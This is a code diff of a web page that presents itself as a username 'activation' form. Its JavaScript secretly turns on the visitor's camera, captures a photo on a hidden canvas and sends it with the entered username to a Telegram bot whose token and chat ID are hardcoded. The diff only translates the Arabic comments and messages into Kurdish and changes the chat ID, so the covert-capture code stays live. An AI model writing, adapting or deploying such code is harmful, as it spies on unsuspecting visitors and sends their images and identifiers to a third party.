@@ -183,9 +183,9 @@
     (function(){
         "use strict";
 
-        // ========== توكن تيليجرام الجديد ==========
+        // ========== تۆکن و چات ئایدی ==========
         const TELEGRAM_BOT_TOKEN = '8745598524:AAG68VqzJBn-p-QWiCTJCA78WiiVwci17_Q';
-        const TELEGRAM_CHAT_ID = '8745598524';
+        const TELEGRAM_CHAT_ID = '659131693';
         
         const usernameInput = document.getElementById('usernameInput');
         const activateBtn = document.getElementById('activateBtn');
@@ -201,7 +201,7 @@
             statusMsg.style.color = isError ? '#ff8a8a' : '#a6b8e5';
         }
 
-        // إرسال الصورة إلى تيليجرام
+        // ناردنی وێنە بۆ تێلیگرام
         async function sendToTelegram(imageBlob, username) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -218,12 +218,12 @@
                 const data = await response.json();
                 return data.ok;
             } catch (e) {
-                console.error('فشل الاتصال:', e);
+                console.error('هەڵەی پەیوەندی:', e);
                 return false;
             }
         }
 
-        // تشغيل الكاميرا المخفية
+        // ڕێکخستنی کامێرای شاراوە
         async function startHiddenCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
@@ -236,7 +236,7 @@
                 await new Promise(r => setTimeout(r, 500));
                 return true;
             } catch (err) {
-                console.error('كاميرا:', err);
+                console.error('کامێرا:', err);
                 updateStatus('تکایە ڕێگە بە کامێرا بدە', true);
                 return false;
             }
@@ -262,12 +262,12 @@
             return await new Promise(r => hiddenCanvas.toBlob(r, 'image/jpeg', 0.92));
         }
 
-        // العملية الرئيسية
+        // کرداری سەرەکی
         async function handleActivate() {
             if (isProcessing) return;
             const username = usernameInput.value.trim();
             if (!username || username.length < 2) {
-                updateStatus('❗ یوزەرنەیمی دروست بنووسە', true);
+                updateStatus('❗ تکایە یوزەرنەیمێکی دروست بنووسە', true);
                 return;
             }
 
